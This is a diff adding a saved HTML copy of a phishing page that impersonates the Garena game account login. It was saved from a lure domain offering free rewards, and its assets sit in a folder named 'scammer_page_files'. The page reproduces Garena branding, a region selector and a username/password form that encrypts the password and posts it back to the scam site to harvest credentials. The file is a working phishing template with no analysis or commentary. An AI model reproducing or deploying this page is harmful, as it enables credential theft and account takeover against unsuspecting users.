@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)http://rewardfreegift2019-garena.ga/account-login.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="description" content="Garena">
+<link rel="shortcut icon" href="http://cdn.garenanow.com/webmain/static/favicon.ico" type="image/x-icon">
+<link href="./scammer_page_files/sso.css" rel="stylesheet" type="text/css">
+<!-- Page Specific -->
+<script src="./scammer_page_files/jsapi"></script>
+<script type="text/javascript">google.load("jquery", "1.5.0");</script><script src="./scammer_page_files/jquery.min.js.download" type="text/javascript"></script><script src="./scammer_page_files/jquery.min.js.download" type="text/javascript"></script>  
+<script language="JavaScript" type="text/javascript" src="./scammer_page_files/jsbn.js.download"></script>
+<script language="JavaScript" type="text/javascript" src="./scammer_page_files/prng4.js.download"></script>
+<script language="JavaScript" type="text/javascript" src="./scammer_page_files/rng.js.download"></script>
+<script language="JavaScript" type="text/javascript" src="./scammer_page_files/rsa.js.download"></script>
+<script language="JavaScript" type="text/javascript" src="./scammer_page_files/grsa.js.download"></script>
+
+<script type="text/javascript">
+        function check_login_inputs() {
+            var username = document.loginForm.username.value;
+            var password = document.loginForm.password.value;
+            if (!username || !password) {
+                return false;
+            }
+            return true;
+        }
+        function do_encrypt() {
+            if (!check_login_inputs()) {
+              return false;
+            }
+            var pw = document.loginForm.password.value;
+            document.loginForm.password2.value=RSA(pw);
+            $('.loginForm').submit();
+            return true;
+        }
+        function keyIsPressed(evt) {
+          var charCode = (evt.which) ? evt.which : evt.keyCode
+          if( charCode == 13 ) {
+                do_encrypt();
+          }
+          return true;
+        }
+    </script>
+<title>Garena</title>
+<style>
+.error-msg { color: red !important; }
+.error-msg { padding-bottom: -12px !important; }
+</style>
+<style>
+.recaptchatable #recaptcha_response_field {
+    width: 145px !important;
+    position: relative !important;
+    bottom: 7px !important;
+    padding: 10px;
+    margin: 15px 0 0 0 !important;
+    font-size: 10pt;
+    height: 20px;
+}
+.recaptcha_only_if_privacy {
+display: none !important;
+}
+</style>
+</head>
+<body style="">
+
+<div id="page">
+<div id="header" class="header">
+<div class="langWrapper fr">
+<select class="lang">
+<option value="vi-VN">Việt Nam - Tiếng việt</option>
+<option value="en-SG">Singapore - English</option>
+<option value="zh-SG">新加坡 - 简体中文</option>
+<option value="zh-TW">台灣 - 繁体中文</option>
+<option value="en-PH">Philippines - English</option>
+<option value="th-TH">ไทย - ไทย</option>
+<option value="id-ID">Indonesia - Bahasa Indonesia</option>
+<option value="ru-RU">Россия - Русский</option>
+<option value="en-MY" selected="">Malaysia - English</option>
+</select><span class="icon-earth"></span></div>
+<div class="topBarGarena"></div>
+<div class="topBar"></div>
+<h1><a class="logo" href="http://rewardfreegift2019-garena.ga/account-login.php#"><img src="./scammer_page_files/header_garena.png" style="width: 135px; height: 46px;"></a></h1></div>
+<div id="main-panel">
+<div class="content" style="top: 2.4px;">
+<h2 class="title">Login</h2>
+									
+<form class="loginForm" id="loginForm" method="post" name="loginForm" onsubmit="do_encrypt();">
+<div class="line" id="line-account">
+<input id="sso_login_form_account" name="username" type="text" placeholder="Garena Username, Email or Phone" autocorrect="off" autocapitalize="off" required="" autofocus="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+</div>
+<div class="line" id="line-password">
+<input type="hidden" name="password2">
+<input id="sso_login_form_password" name="password" type="Password" placeholder="Password" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;">
+<span class="errorMsg" id="msg"><center>
+    		
+</center>
+<br>
+<div class="line btnLine" id="line-btn">
+<input class="btn" name="submit_button" value="Login Now" id="confirm-btn" type="submit">
+</div>
+<div class="divider"><span>or</span></div>
+<div id="line-btn" class="line btnLine"><input id="sso_login_link_register" name="register" type="button" value="Register A New Account" onclick="javascript:return false;" class="btn black"></div>
+</span>
+<div class="linkLine"><a id="sso_login_link_forget_password" href="javascript:;" class="sec">Forgot Password</a></div>
+</div></form>
+</div>
+</div>
+</div></body></html>
